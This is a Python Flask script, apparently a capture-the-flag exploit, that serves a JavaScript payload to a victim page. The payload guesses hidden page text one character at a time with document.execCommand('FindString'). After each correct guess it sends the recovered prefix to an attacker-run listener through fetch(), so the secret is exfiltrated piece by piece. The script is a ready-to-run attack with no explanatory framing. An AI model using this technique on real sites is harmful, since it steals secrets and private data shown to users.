from flask import Flask
from flask_cors import CORS
app = Flask(__name__)
CORS(app)
@app.route('/1')
def serve_js():
    return """
(() => {
  const dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!$%&'()*+,-./:;<=>?@[]^_`{|}~ ";
  let flag = "DCTF{";
  for (let pos = 0; pos < 40; pos++) {
    for (let i = 0; i < dic.length; i++) {
      const testString = flag + dic[i];
      if (document.execCommand('FindString', false, testString)) {
        flag += dic[i];
        fetch("http://127.0.0.1:8880?q=" + flag);
      }
    }
  }
})();
""", 200, {"Content-Type": "application/javascript"}

if __name__ == '__main__':
    app.run(debug=True, port=8880, host='0.0.0.0')